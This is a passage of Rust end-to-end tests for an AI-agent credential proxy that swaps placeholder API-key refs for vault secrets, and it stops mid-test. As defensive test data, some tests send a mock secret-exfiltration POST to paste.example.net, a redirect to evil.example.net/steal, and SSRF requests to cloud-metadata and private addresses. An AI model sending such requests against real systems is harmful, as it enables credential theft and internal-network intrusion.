//! End-to-end tests: a real proxy, a local TLS echo server standing in for the provider, and the
//! L00 fakes for vault, receipts and approvals. Everything runs on 127.0.0.1; the test resolver
//! maps provider names there, and only these tests may reach loopback upstreams.

use std::collections::HashMap;
use std::convert::Infallible;
use std::net::{IpAddr, SocketAddr};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use bytes::Bytes;
use http::{Request, Response, StatusCode};
use http_body_util::combinators::BoxBody;
use http_body_util::{BodyExt, Full};
use hyper::body::Incoming;
use hyper::service::service_fn;
use hyper_util::rt::{TokioExecutor, TokioIo};
use ms_approve::fake::FakeApprover;
use ms_approve::{ApprovalOutcome, ApprovalToken};
use ms_core::{
    AgentKind, ApprovalRequest, Decision, KeyMeta, KeyName, Mode, Reason, ReceiptResult,
    Request as PolicyRequest, SecretBytes, SessionId, Tier,
};
use ms_receipts::memory::MemorySink;
use ms_vault::Vault;
use ms_vault::memory::MemoryVault;
use rcgen::{BasicConstraints, CertificateParams, IsCa, Issuer, KeyPair};
use rustls_pki_types::{CertificateDer, PrivateKeyDer, PrivatePkcs8KeyDer, ServerName};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::Notify;

use crate::ssrf::{BoxFuture, Resolve};
use crate::*;

const CANARY: &str = "sk_test_CANARY_7f3a9c";
const STRIPE: &str = "api.stripe.com";
const MAPS: &str = "maps.example.com";

type BoxError = Box<dyn std::error::Error + Send + Sync>;
type TestBody = BoxBody<Bytes, BoxError>;

fn session() -> SessionId {
    SessionId {
        agent: AgentKind::ClaudeCode,
        pid: 4242,
        started_unix_ms: 1,
    }
}

// ---------- fakes ----------

#[derive(Debug)]
struct FakePolicy(Mutex<Decision>);
impl Policy for FakePolicy {
    fn decide(&self, _: &SessionId, _: &PolicyRequest) -> (Decision, u64) {
        (self.0.lock().unwrap().clone(), 7)
    }
    fn version(&self) -> u64 {
        7
    }
}

#[derive(Debug)]
struct FixedSession(Option<SessionId>, Mutex<Vec<Option<String>>>);
impl SessionResolver for FixedSession {
    fn resolve(
        &self,
        peer: SocketAddr,
        local: SocketAddr,
        user: Option<&str>,
    ) -> Option<SessionId> {
        assert!(peer.ip().is_loopback() && local.ip().is_loopback());
        self.1.lock().unwrap().push(user.map(str::to_owned));
        self.0.clone()
    }
}

#[derive(Debug, Default)]
struct Egress(Mutex<Vec<BlockEvent>>);
impl EgressObserver for Egress {
    fn blocked(&self, e: &BlockEvent) {
        self.0.lock().unwrap().push(e.clone());
    }
}

#[derive(Debug, Default)]
struct TableResolver {
    names: HashMap<String, IpAddr>,
    asked: Mutex<Vec<String>>,
}
impl Resolve for TableResolver {
    fn resolve<'a>(
        &'a self,
        host: &'a str,
        port: u16,
    ) -> BoxFuture<'a, std::io::Result<Vec<SocketAddr>>> {
        self.asked.lock().unwrap().push(host.to_owned());
        let v: Vec<SocketAddr> = self
            .names
            .get(host)
            .map(|ip| vec![SocketAddr::new(*ip, port)])
            .unwrap_or_default();
        Box::pin(async move { Ok(v) })
    }
}

// ---------- upstream echo server ----------

#[derive(Debug, Default)]
struct Echo {
    hits: AtomicUsize,
    gate: Notify,
}

struct Upstream {
    port: u16,
    root: CertificateDer<'static>,
    echo: Arc<Echo>,
}

fn upstream_pki(
    hosts: &[&str],
) -> (
    CertificateDer<'static>,
    Vec<CertificateDer<'static>>,
    PrivateKeyDer<'static>,
) {
    let ca_key = KeyPair::generate().unwrap();
    let mut ca = CertificateParams::default();
    ca.is_ca = IsCa::Ca(BasicConstraints::Unconstrained);
    let ca_cert = ca.self_signed(&ca_key).unwrap();
    let issuer = Issuer::new(ca, ca_key);
    let key = KeyPair::generate().unwrap();
    let leaf = CertificateParams::new(hosts.iter().map(|h| h.to_string()).collect::<Vec<_>>())
        .unwrap()
        .signed_by(&key, &issuer)
        .unwrap();
    (
        ca_cert.der().clone(),
        vec![leaf.der().clone()],
        PrivateKeyDer::Pkcs8(PrivatePkcs8KeyDer::from(key.serialize_der())),
    )
}

async fn echo_handler(
    req: Request<Incoming>,
    st: Arc<Echo>,
) -> Result<Response<TestBody>, Infallible> {
    st.hits.fetch_add(1, Ordering::SeqCst);
    let path = req.uri().path().to_owned();
    if path == "/redirect" {
        let mut r = Response::new(Full::new(Bytes::new()).map_err(|n| match n {}).boxed());
        *r.status_mut() = StatusCode::FOUND;
        r.headers_mut().insert(
            "location",
            "https://evil.example.net/steal".parse().unwrap(),
        );
        return Ok(r);
    }
    if path == "/big" {
        let (mut tx, body) = http_body_util::channel::Channel::<Bytes, BoxError>::new(4);
        tokio::spawn(async move {
            let _ = tx.send_data(Bytes::from_static(b"FIRST-CHUNK|")).await;
            st.gate.notified().await;
            for _ in 0..64 {
                if tx
                    .send_data(Bytes::from(vec![b'x'; 64 * 1024]))
                    .await
                    .is_err()
                {
                    return;
                }
            }
        });
        return Ok(Response::new(body.boxed()));
    }
    let mut out = format!("{} {} {:?}\n", req.method(), req.uri(), req.version());
    for (k, v) in req.headers() {
        out.push_str(&format!(
            "{}: {}\n",
            k,
            String::from_utf8_lossy(v.as_bytes())
        ));
    }
    let body = req.into_body().collect().await.unwrap().to_bytes();
    out.push('\n');
    out.push_str(&String::from_utf8_lossy(&body));
    Ok(Response::new(
        Full::new(Bytes::from(out)).map_err(|n| match n {}).boxed(),
    ))
}

async fn start_upstream(h1_only: bool) -> Upstream {
    let (root, chain, key) = upstream_pki(&[STRIPE, MAPS]);
    let mut cfg = rustls::ServerConfig::builder_with_provider(crate::tls::provider())
        .with_safe_default_protocol_versions()
        .unwrap()
        .with_no_client_auth()
        .with_single_cert(chain, key)
        .unwrap();
    cfg.alpn_protocols = if h1_only {
        vec![b"http/1.1".to_vec()]
    } else {
        vec![b"h2".to_vec(), b"http/1.1".to_vec()]
    };
    let acceptor = tokio_rustls::TlsAcceptor::from(Arc::new(cfg));
    let l = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = l.local_addr().unwrap().port();
    let echo = Arc::new(Echo::default());
    let st = echo.clone();
    tokio::spawn(async move {
        loop {
            let Ok((tcp, _)) = l.accept().await else {
                return;
            };
            let acceptor = acceptor.clone();
            let st = st.clone();
            tokio::spawn(async move {
                let Ok(tls) = acceptor.accept(tcp).await else {
                    return;
                };
                let svc = service_fn(move |r| echo_handler(r, st.clone()));
                let _ = hyper_util::server::conn::auto::Builder::new(TokioExecutor::new())
                    .serve_connection(TokioIo::new(tls), svc)
                    .await;
            });
        }
    });
    Upstream { port, root, echo }
}

// ---------- harness ----------

struct H {
    proxy: SocketAddr,
    up: Upstream,
    receipts: Arc<MemorySink>,
    egress: Arc<Egress>,
    resolver: Arc<TableResolver>,
    policy: Arc<FakePolicy>,
    ca: Arc<Ca>,
    sessions: Arc<FixedSession>,
}

struct Opts {
    loopback_ok: bool,
    session: Option<SessionId>,
    approver: Option<Arc<FakeApprover>>,
    max_body: usize,
    extra_names: Vec<(&'static str, IpAddr)>,
    upstream_h1_only: bool,
    max_connections: usize,
    tunnel_idle: Duration,
}

impl Default for Opts {
    fn default() -> Self {
        Self {
            loopback_ok: true,
            session: Some(session()),
            approver: None,
            max_body: 1024 * 1024,
            extra_names: Vec::new(),
            upstream_h1_only: false,
            max_connections: 256,
            tunnel_idle: Duration::from_secs(300),
        }
    }
}

fn bindings(port: u16) -> Vec<Binding> {
    vec![
        Binding {
            key: KeyName::new("stripe/test").unwrap(),
            provider: "stripe".into(),
            hosts: vec![STRIPE.into()],
            port,
            location: Location::Header {
                name: "authorization".into(),
                prefix: "Bearer ".into(),
            },
            shaped_placeholder: Some("sk_test_ms_0000placeholder".into()),
        },
        Binding {
            key: KeyName::new("maps/test").unwrap(),
            provider: "maps".into(),
            hosts: vec![MAPS.into()],
            port,
            location: Location::Query {
                param: "key".into(),
            },
            shaped_placeholder: None,
        },
    ]
}

async fn harness(o: Opts) -> H {
    let up = start_upstream(o.upstream_h1_only).await;
    let vault = Arc::new(MemoryVault::new());
    for (k, v) in [("stripe/test", CANARY), ("maps/test", "AIza-MAPS-CANARY")] {
        let name = KeyName::new(k).unwrap();
        vault
            .put(
                &name,
                SecretBytes::from(v.to_owned()),
                KeyMeta {
                    name: name.clone(),
                    mode: Mode::Swap,
                    tier: Tier::Test,
                    created_unix_ms: 0,
                },
            )
            .unwrap();
    }
    let ca = Arc::new(Ca::generate([STRIPE, MAPS]).unwrap());
    let mut names: HashMap<String, IpAddr> = [
        (STRIPE.to_owned(), "127.0.0.1".parse().unwrap()),
        (MAPS.to_owned(), "127.0.0.1".parse().unwrap()),
        (
            "allowed.example.com".to_owned(),
            "127.0.0.1".parse().unwrap(),
        ),
    ]
    .into();
    for (n, ip) in o.extra_names {
        names.insert(n.into(), ip);
    }
    let resolver = Arc::new(TableResolver {
        names,
        asked: Mutex::default(),
    });
    let receipts = Arc::new(MemorySink::new());
    let egress = Arc::new(Egress::default());
    let policy = Arc::new(FakePolicy(Mutex::new(Decision::Allow)));
    let sessions = Arc::new(FixedSession(o.session, Mutex::default()));
    let mut cfg = ProxyConfig::new("127.0.0.1:0".parse().unwrap());
    cfg.bindings = bindings(up.port);
    cfg.allow = vec![
        "allowed.example.com".into(),
        "*.allowed.example".into(),
        "github.com".into(),
    ];
    cfg.limits.max_body_bytes = o.max_body;
    cfg.limits.max_connections = o.max_connections;
    cfg.limits.tunnel_idle_timeout = o.tunnel_idle;
    cfg.upstream_roots = UpstreamRoots::Only(vec![up.root.clone()]);
    let mut deps = Deps::new(
        vault,
        policy.clone(),
        receipts.clone(),
        sessions.clone(),
        ca.clone(),
    );
    deps.egress = egress.clone();
    deps.resolver = resolver.clone();
    deps.approver = o.approver.map(|a| a as Arc<dyn ms_approve::Approver>);
    let mut proxy = Proxy::bind(cfg, deps).await.unwrap();
    if o.loopback_ok {
        proxy.allow_loopback_upstreams_for_tests();
    }
    let addr = proxy.local_addr().unwrap();
    tokio::spawn(proxy.serve(std::future::pending()));
    H {
        proxy: addr,
        up,
        receipts,
        egress,
        resolver,
        policy,
        ca,
        sessions,
    }
}

/// Sends raw bytes to the proxy and returns everything it answers.
async fn raw(proxy: SocketAddr, bytes: &[u8]) -> String {
    let mut s = TcpStream::connect(proxy).await.unwrap();
    s.write_all(bytes).await.unwrap();
    let mut out = Vec::new();
    let _ = tokio::time::timeout(Duration::from_secs(5), s.read_to_end(&mut out)).await;
    String::from_utf8_lossy(&out).into_owned()
}

/// Sends CONNECT and returns the status line and the stream.
async fn connect(proxy: SocketAddr, authority: &str, extra: &str) -> (u16, String, TcpStream) {
    let mut s = TcpStream::connect(proxy).await.unwrap();
    s.write_all(
        format!("CONNECT {authority} HTTP/1.1\r\nHost: {authority}\r\n{extra}\r\n").as_bytes(),
    )
    .await
    .unwrap();
    let mut head = Vec::new();
    let mut b = [0u8; 1];
    while !head.ends_with(b"\r\n\r\n") {
        if s.read(&mut b).await.unwrap() == 0 {
            break;
        }
        head.push(b[0]);
    }
    let head = String::from_utf8_lossy(&head).into_owned();
    let code = head.get(9..12).and_then(|c| c.parse().ok()).unwrap_or(0);
    // Read the refusal body, if any, for message checks.
    let mut body = String::new();
    let len = head
        .lines()
        .find_map(|l| {
            l.to_ascii_lowercase()
                .strip_prefix("content-length: ")
                .map(str::to_owned)
        })
        .and_then(|n| n.trim().parse::<usize>().ok())
        .unwrap_or(0);
    if code != 200 && len > 0 {
        let mut buf = vec![0; len];
        s.read_exact(&mut buf).await.unwrap();
        body = String::from_utf8_lossy(&buf).into_owned();
    }
    (code, head + &body, s)
}

struct Got {
    status: StatusCode,
    headers: http::HeaderMap,
    body: String,
}

/// One HTTPS request through a CONNECT tunnel, trusting only the morsec CA.
async fn https(h: &H, host: &str, h2: bool, req: Request<Full<Bytes>>) -> Got {
    let (code, head, tcp) = connect(h.proxy, &format!("{host}:{}", h.up.port), "").await;
    assert_eq!(code, 200, "{head}");
    let mut roots = rustls::RootCertStore::empty();
    roots.add(h.ca.cert_der().clone()).unwrap();
    let mut cfg = rustls::ClientConfig::builder_with_provider(crate::tls::provider())
        .with_safe_default_protocol_versions()
        .unwrap()
        .with_root_certificates(roots)
        .with_no_client_auth();
    cfg.alpn_protocols = vec![if h2 {
        b"h2".to_vec()
    } else {
        b"http/1.1".to_vec()
    }];
    let tls = tokio_rustls::TlsConnector::from(Arc::new(cfg))
        .connect(ServerName::try_from(host.to_owned()).unwrap(), tcp)
        .await
        .unwrap();
    let resp = if h2 {
        let (mut s, c) =
            hyper::client::conn::http2::handshake(TokioExecutor::new(), TokioIo::new(tls))
                .await
                .unwrap();
        tokio::spawn(c);
        s.send_request(req).await.unwrap()
    } else {
        let (mut s, c) = hyper::client::conn::http1::handshake(TokioIo::new(tls))
            .await
            .unwrap();
        tokio::spawn(c);
        s.send_request(req).await.unwrap()
    };
    let (parts, body) = resp.into_parts();
    let body = body.collect().await.unwrap().to_bytes();
    Got {
        status: parts.status,
        headers: parts.headers,
        body: String::from_utf8_lossy(&body).into_owned(),
    }
}

fn get(
    h2: bool,
    host: &str,
    port: u16,
    path: &str,
    headers: &[(&str, &str)],
) -> Request<Full<Bytes>> {
    let mut b = Request::builder();
    if h2 {
        b = b
            .uri(format!("https://{host}:{port}{path}"))
            .version(http::Version::HTTP_2);
    } else {
        b = b.uri(path).header("host", format!("{host}:{port}"));
    }
    for (k, v) in headers {
        b = b.header(*k, *v);
    }
    b.body(Full::new(Bytes::new())).unwrap()
}

fn assert_no_canary(h: &H, extra: &str) {
    let all = format!(
        "{:?} {:?} {extra}",
        h.receipts.events(),
        h.egress.0.lock().unwrap()
    );
    assert!(!all.contains("CANARY"), "canary leaked: {all}");
}

// ---------- tests ----------

// protects=AC1/GW-1: the vault value replaces the agent's bearer placeholder upstream, X-Api-Key
// and Cookie are stripped, one Allowed receipt is written; fails_when=the placeholder or the
// agent's credentials reach upstream, or the receipt is missing/wrong; no_claim=h2 (next test)
#[tokio::test]
async fn swap_over_http1() {
    let h = harness(Opts::default()).await;
    let req = get(
        false,
        STRIPE,
        h.up.port,
        "/v1/charges",
        &[
            ("authorization", "Bearer ms://stripe/test"),
            ("x-api-key", "agent-own-key"),
            ("cookie", "session=agent"),
            ("proxy-authorization", "Basic Y2xhdWRlOg=="),
        ],
    );
    let got = https(&h, STRIPE, false, req).await;
    assert_eq!(got.status, 200, "{}", got.body);
    assert!(
        got.body
            .contains(&format!("authorization: Bearer {CANARY}")),
        "{}",
        got.body
    );
    assert_eq!(
        got.body.matches("authorization:").count(),
        1,
        "{}",
        got.body
    );
    for gone in ["ms://", "x-api-key", "agent-own-key", "cookie", "proxy-"] {
        assert!(
            !got.body.contains(gone),
            "{gone} reached upstream: {}",
            got.body
        );
    }
    assert!(got.body.starts_with("GET "), "{}", got.body);
    assert!(got.body.contains("/v1/charges "), "{}", got.body);
    let ev = h.receipts.events();
    assert_eq!(ev.len(), 1);
    assert_eq!(ev[0].key.as_str(), "stripe/test");
    assert_eq!(ev[0].result, ReceiptResult::Allowed);
    assert_eq!(ev[0].target, STRIPE);
    assert_eq!(ev[0].rule_version, 7);
    assert_eq!(ev[0].session, session());
    assert_no_canary(&h, "");
}

// protects=AC2: the same swap works when the agent speaks h2 inside the tunnel and the
// upstream negotiates h2; fails_when=h2 requests fail or are not swapped; no_claim=h2c
#[tokio::test]
async fn swap_over_http2() {
    let h = harness(Opts::default()).await;
    for _ in 0..3 {
        let req = get(
            true,
            STRIPE,
            h.up.port,
            "/v1/balance",
            &[("authorization", "Bearer sk_test_ms_0000placeholder")],
        );
        let got = https(&h, STRIPE, true, req).await;
        assert_eq!(got.status, 200, "{}", got.body);
        assert!(got.body.contains("HTTP/2.0"), "{}", got.body);
        assert!(
            got.body
                .contains(&format!("authorization: Bearer {CANARY}")),
            "{}",
            got.body
        );
    }
    assert_eq!(h.receipts.events().len(), 3);
}

// protects=the HTTP/1.1 upstream path: requests are origin-form with Host, swapped, and several
// requests on one tunnel (h1 and concurrent h2 from the agent) all succeed over reused or fresh
// upstream connections; fails_when=the h1 upstream gets an absolute URI, no Host, or a request
// stalls; no_claim=pool sizing
#[tokio::test]
async fn swap_with_http1_upstream() {
    let h = harness(Opts {
        upstream_h1_only: true,
        ..Opts::default()
    })
    .await;
    let got = https(
        &h,
        STRIPE,
        false,
        get(
            false,
            STRIPE,
            h.up.port,
            "/v1/a?x=1",
            &[("authorization", "Bearer ms://stripe/test")],
        ),
    )
    .await;
    assert!(
        got.body.starts_with("GET /v1/a?x=1 HTTP/1.1\n"),
        "{}",
        got.body
    );
    assert!(
        got.body.contains(&format!("host: {STRIPE}:{}", h.up.port)),
        "{}",
        got.body
    );
    assert!(
        got.body
            .contains(&format!("authorization: Bearer {CANARY}")),
        "{}",
        got.body
    );

    // Concurrent h2 streams from the agent over one tunnel, h1 upstream.
    let (code, _, tcp) = connect(h.proxy, &format!("{STRIPE}:{}", h.up.port), "").await;
    assert_eq!(code, 200);
    let mut roots = rustls::RootCertStore::empty();
    roots.add(h.ca.cert_der().clone()).unwrap();
    let mut cfg = rustls::ClientConfig::builder_with_provider(crate::tls::provider())
        .with_safe_default_protocol_versions()
        .unwrap()
        .with_root_certificates(roots)
        .with_no_client_auth();
    cfg.alpn_protocols = vec![b"h2".to_vec()];
    let tls = tokio_rustls::TlsConnector::from(Arc::new(cfg))
        .connect(ServerName::try_from(STRIPE.to_owned()).unwrap(), tcp)
        .await
        .unwrap();
    let (s, c) = hyper::client::conn::http2::handshake(TokioExecutor::new(), TokioIo::new(tls))
        .await
        .unwrap();
    tokio::spawn(c);
    let mut tasks = Vec::new();
    for i in 0..8 {
        let mut s = s.clone();
        let req = get(
            true,
            STRIPE,
            h.up.port,
            &format!("/n/{i}"),
            &[("authorization", "Bearer ms://stripe/test")],
        );
        tasks.push(tokio::spawn(async move {
            let r = s.send_request(req).await.unwrap();
            String::from_utf8_lossy(&r.into_body().collect().await.unwrap().to_bytes()).into_owned()
        }));
    }
    for (i, t) in tasks.into_iter().enumerate() {
        let body = tokio::time::timeout(Duration::from_secs(10), t)
            .await
            .unwrap()
            .unwrap();
        assert!(body.starts_with(&format!("GET /n/{i} HTTP/1.1")), "{body}");
        assert!(body.contains(CANARY), "{body}");
    }
    assert_eq!(h.receipts.events().len(), 9);
}

// protects=AC3: query-parameter location swaps through the proxy and the agent's
// Authorization is dropped; fails_when=the param keeps the placeholder or auth leaks;
// no_claim=Basic (unit-tested in rewrite)
#[tokio::test]
async fn swap_query_location() {
    let h = harness(Opts::default()).await;
    let req = get(
        false,
        MAPS,
        h.up.port,
        "/geo?q=x&key=ms://maps/test",
        &[("authorization", "Bearer agent")],
    );
    let got = https(&h, MAPS, false, req).await;
    assert_eq!(got.status, 200, "{}", got.body);
    assert!(got.body.contains("key=AIza-MAPS-CANARY"), "{}", got.body);
    assert!(!got.body.contains("authorization"), "{}", got.body);
}

// protects=AC4 mockup exfil (INJ-2): ms://stripe/test sent to paste.example.net is refused over
// plain http (receipt for stripe/test) and CONNECT (BlockEvent), and the host is never even
// resolved; fails_when=either form gets through, is unrecorded, or touches DNS;
// no_claim=allowlisted hosts (tunnelled uninspected by design)
#[tokio::test]
async fn exfil_to_paste_site_blocked() {
    let h = harness(Opts::default()).await;
    let body = "data=ms://stripe/test";
    let resp = raw(
        h.proxy,
        format!(
            "POST http://paste.example.net/api HTTP/1.1\r\nHost: paste.example.net\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        )
        .as_bytes(),
    )
    .await;
    assert!(resp.starts_with("HTTP/1.1 403"), "{resp}");
    assert!(
        resp.contains("ms://stripe/test is not bound to paste.example.net"),
        "{resp}"
    );
    let ev = h.receipts.events();
    assert_eq!(ev.len(), 1);
    assert_eq!(ev[0].result, ReceiptResult::Blocked(Reason::HostNotAllowed));
    assert_eq!(ev[0].target, "paste.example.net");

    let (code, msg, _) = connect(h.proxy, "paste.example.net:443", "").await;
    assert_eq!(code, 403, "{msg}");
    assert!(msg.contains("not on the egress allowlist"), "{msg}");
    let blocks = h.egress.0.lock().unwrap().clone();
    assert!(
        blocks
            .iter()
            .any(|b| b.host == "paste.example.net" && b.kind == BlockKind::NotAllowed),
        "{blocks:?}"
    );
    assert!(
        !h.resolver
            .asked
            .lock()
            .unwrap()
            .iter()
            .any(|n| n.contains("paste"))
    );
    assert_eq!(h.up.echo.hits.load(Ordering::SeqCst), 0);
    assert_no_canary(&h, &resp);
}

// protects=AC5: a ref to a key not bound to this host, in a header or in the body, blocks the
// request with a receipt and nothing reaches upstream; fails_when=the request is forwarded;
// no_claim=refs in tunnelled (allowlisted) traffic
#[tokio::test]
async fn foreign_ref_to_bound_host_blocked() {
    let h = harness(Opts::default()).await;
    let req = get(
        false,
        STRIPE,
        h.up.port,
        "/",
        &[("x-forward", "ms://aws/prod")],
    );
    let got = https(&h, STRIPE, false, req).await;
    assert_eq!(got.status, 403, "{}", got.body);
    let mut req = get(
        false,
        STRIPE,
        h.up.port,
        "/",
        &[("authorization", "Bearer ms://stripe/test")],
    );
    *req.body_mut() = Full::new(Bytes::from_static(b"{\"k\":\"ms://maps/test\"}"));
    *req.method_mut() = http::Method::POST;
    let got = https(&h, STRIPE, false, req).await;
    assert_eq!(got.status, 403, "{}", got.body);
    assert!(
        got.body
            .contains("ms://maps/test is not bound to api.stripe.com"),
        "{}",
        got.body
    );
    assert_eq!(h.up.echo.hits.load(Ordering::SeqCst), 0);
    let keys: Vec<_> = h
        .receipts
        .events()
        .iter()
        .map(|e| e.key.to_string())
        .collect();
    assert_eq!(keys, ["aws/prod", "maps/test"]);
}

// protects=AC6 INJ-4: metadata, loopback, private and v4-mapped literals, names resolving to
// non-public addresses (including a bound host), and arbitrary domains are all unreachable, over
// CONNECT and plain http; fails_when=any returns anything but 403 or reaches a socket;
// no_claim=the classifier table (unit-tested in ssrf)
#[tokio::test]
async fn ssrf_targets_unreachable() {
    let h = harness(Opts {
        loopback_ok: false,
        extra_names: vec![
            ("meta.allowed.example", "169.254.169.254".parse().unwrap()),
            ("priv.allowed.example", "10.0.0.1".parse().unwrap()),
            (
                "v6.allowed.example",
                "::ffff:169.254.169.254".parse().unwrap(),
            ),
        ],
        ..Opts::default()
    })
    .await;
    for target in [
        "169.254.169.254:80",
        "127.0.0.1:443",
        "10.0.0.1:443",
        "[::1]:443",
        "[::ffff:169.254.169.254]:443",
        "meta.allowed.example:443",
        "priv.allowed.example:443",
        "v6.allowed.example:443",
        "allowed.example.com:443",
        &format!("{STRIPE}:{}", h.up.port),
        "www.some-random-domain.example:443",
    ] {
        let (code, msg, _) = connect(h.proxy, target, "").await;
        assert_eq!(code, 403, "{target}: {msg}");
    }
    for url in [
        "http://169.254.169.254/latest/meta-data/",
        "http://meta.allowed.example/latest/meta-data/",
        "http://priv.allowed.example/",
        "http://www.some-random-domain.example/",
    ] {
        let resp = raw(
            h.proxy,
            format!("GET {url} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n").as_bytes(),
        )
        .await;
        assert!(resp.starts_with("HTTP/1.1 403"), "{url}: {resp}");
    }
    let blocks = h.egress.0.lock().unwrap().clone();
    assert!(
        blocks
            .iter()
            .any(|b| b.kind == BlockKind::NonPublicAddress && b.host == "meta.allowed.example")
    );
    assert_eq!(h.up.echo.hits.load(Ordering::SeqCst), 0);
}

// protects=an allowlisted, unbound host is tunnelled byte-for-byte (the echo server sees the
// agent's own TLS and headers, no swap, no receipt); fails_when=the tunnel is refused or
// inspected; no_claim=that tunnelled traffic is safe (only refs can be in it)
#[tokio::test]
async fn allowlisted_host_tunnelled() {
    let h = harness(Opts::default()).await;
    let (code, msg, tcp) =
        connect(h.proxy, &format!("allowed.example.com:{}", h.up.port), "").await;
    assert_eq!(code, 200, "{msg}");
    // The agent must trust the upstream's own root here: the proxy is not in the TLS path.
    let mut roots = rustls::RootCertStore::empty();
    roots.add(h.up.root.clone()).unwrap();
    let cfg = rustls::ClientConfig::builder_with_provider(crate::tls::provider())
        .with_safe_default_protocol_versions()
        .unwrap()
        .with_root_certificates(roots)
        .with_no_client_auth();
    let tls = tokio_rustls::TlsConnector::from(Arc::new(cfg))
        .connect(ServerName::try_from(STRIPE.to_owned()).unwrap(), tcp)
        .await
        .unwrap();
    let (mut s, c) = hyper::client::conn::http1::handshake(TokioIo::new(tls))
        .await
        .unwrap();
    tokio::spawn(c);
    let resp = s
        .send_request(get(
            false,
            "allowed.example.com",
            0,
            "/",
            &[("authorization", "Bearer ms://stripe/test")],
        ))
        .await
        .unwrap();
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let body = String::from_utf8_lossy(&body);
    assert!(
        body.contains("authorization: Bearer ms://stripe/test"),
        "{body}"
    );
    assert!(h.receipts.events().is_empty());
}

// protects=R1/S1: CONNECT tunnels hold a connection permit for their whole life, so the
// max_connections cap bounds tunnels, and an idle tunnel is closed; fails_when=a third tunnel
// is accepted while two are open, or an idle tunnel stays open; no_claim=h2 stream limits
#[tokio::test]
async fn tunnels_are_bounded_and_idle_closed() {
    let h = harness(Opts {
        max_connections: 2,
        tunnel_idle: Duration::from_millis(400),
        ..Opts::default()
    })
    .await;
    let target = format!("allowed.example.com:{}", h.up.port);
    let (c1, _, t1) = connect(h.proxy, &target, "").await;
    let (c2, _, _t2) = connect(h.proxy, &target, "").await;
    assert_eq!((c1, c2), (200, 200));
    // A third connection is not served while both tunnels live.
    let third =
        tokio::time::timeout(Duration::from_millis(250), connect(h.proxy, &target, "")).await;
    assert!(
        third.is_err(),
        "a third tunnel was served past max_connections"
    );
    // Idle tunnels close on their own, freeing the permits.
    let mut t1 = t1;
    let mut b = [0u8; 1];
    let closed = tokio::time::timeout(Duration::from_secs(3), t1.read(&mut b)).await;
    assert!(
        matches!(closed, Ok(Ok(0)) | Ok(Err(_))),
        "idle tunnel stayed open: {closed:?}"
    );
    let (c3, msg, _) = tokio::time::timeout(Duration::from_secs(3), connect(h.proxy, &target, ""))
        .await
        .expect("permit freed after idle close");
    assert_eq!(c3, 200, "{msg}");
}

// protects=R2: a plain-http body over the limit is never silently truncated: a ref in the
// prefix still gets a receipt, and an allowlisted forward gets 413; fails_when=the receipt is
// missing or the request is forwarded empty; no_claim=chunked framing edge cases
#[tokio::test]
async fn oversized_plain_bodies() {
    let h = harness(Opts {
        max_body: 1024,
        ..Opts::default()
    })
    .await;
    let mut body = b"data=ms://stripe/test&pad=".to_vec();
    body.resize(4096, b'x');
    let mut req = format!(
        "POST http://paste.example.net/ HTTP/1.1\r\nHost: paste.example.net\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
        body.len()
    )
    .into_bytes();
    req.extend_from_slice(&body);
    let resp = raw(h.proxy, &req).await;
    assert!(resp.starts_with("HTTP/1.1 403"), "{resp}");
    assert_eq!(h.receipts.events().len(), 1);

    let mut req = b"POST http://allowed.example.com/ HTTP/1.1\r\nHost: allowed.example.com\r\nContent-Length: 4096\r\nConnection: close\r\n\r\n"
        .to_vec();
    req.extend_from_slice(&[b'y'; 4096]);
    let resp = raw(h.proxy, &req).await;
    assert!(resp.starts_with("HTTP/1.1 413"), "{resp}");
}

// protects=AC7: a 302 from upstream reaches the agent with its Location unchanged, and the
// proxy makes exactly one upstream request; fails_when=the proxy follows it; no_claim=client
#[tokio::test]
async fn redirects_not_followed() {
    let h = harness(Opts::default()).await;
    let req = get(
        false,
        STRIPE,
        h.up.port,
        "/redirect",
        &[("authorization", "Bearer ms://stripe/test")],
    );
    let got = https(&h, STRIPE, false, req).await;
    assert_eq!(got.status, StatusCode::FOUND);
    assert_eq!(got.headers["location"], "https://evil.example.net/steal");
    assert_eq!(h.up.echo.hits.load(Ordering::SeqCst), 1);
}

// protects=AC8: base-URL mode /p/stripe/... swaps and forwards to the bound host's path;
// fails_when=the path keeps /p/stripe, the key is not swapped, or an unknown provider passes;
// no_claim=connector config for base URLs (L08)
#[tokio::test]
async fn base_url_mode() {
    let h = harness(Opts::default()).await;
    let resp = raw(
        h.proxy,
        b"GET /p/stripe/v1/charges?limit=3 HTTP/1.1\r\nHost: 127.0.0.1\r\nAuthorization: Bearer ms://stripe/test\r\nConnection: close\r\n\r\n",
    )
    .await;
    assert!(resp.starts_with("HTTP/1.1 200"), "{resp}");
    assert!(
        resp.contains(&format!("{STRIPE}:{}/v1/charges?limit=3 ", h.up.port)),
        "{resp}"
    );
    assert!(
        resp.contains(&format!("authorization: Bearer {CANARY}")),
        "{resp}"
    );
    let resp = raw(
        h.proxy,
        b"GET /p/nope/x HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n",
    )
    .await;
    assert!(resp.starts_with("HTTP/1.1 404"), "{resp}");
}

// protects=AC9: an inspected request body over the limit gets 413 and is not forwarded; a large
// response streams (the first chunk arrives while upstream is still holding the rest);
// fails_when=the oversize body is forwarded or the response is buffered whole; no_claim=throughput
#[tokio::test]
async fn body_limit_and_streaming() {
    let h = harness(Opts {
        max_body: 1024,
        ..Opts::default()
    })
    .await;
    let mut req = get(
        false,
        STRIPE,
        h.up.port,
        "/",
        &[("authorization", "Bearer ms://stripe/test")],
    );
    *req.method_mut() = http::Method::POST;
    *req.body_mut() = Full::new(Bytes::from(vec![b'a'; 4096]));
    let got = https(&h, STRIPE, false, req).await;
    assert_eq!(got.status, StatusCode::PAYLOAD_TOO_LARGE, "{}", got.body);
    assert_eq!(h.up.echo.hits.load(Ordering::SeqCst), 0);

    // Streaming: read the first chunk before releasing the upstream.
    let (code, _, tcp) = connect(h.proxy, &format!("{STRIPE}:{}", h.up.port), "").await;
    assert_eq!(code, 200);
    let mut roots = rustls::RootCertStore::empty();
    roots.add(h.ca.cert_der().clone()).unwrap();
    let cfg = rustls::ClientConfig::builder_with_provider(crate::tls::provider())
        .with_safe_default_protocol_versions()
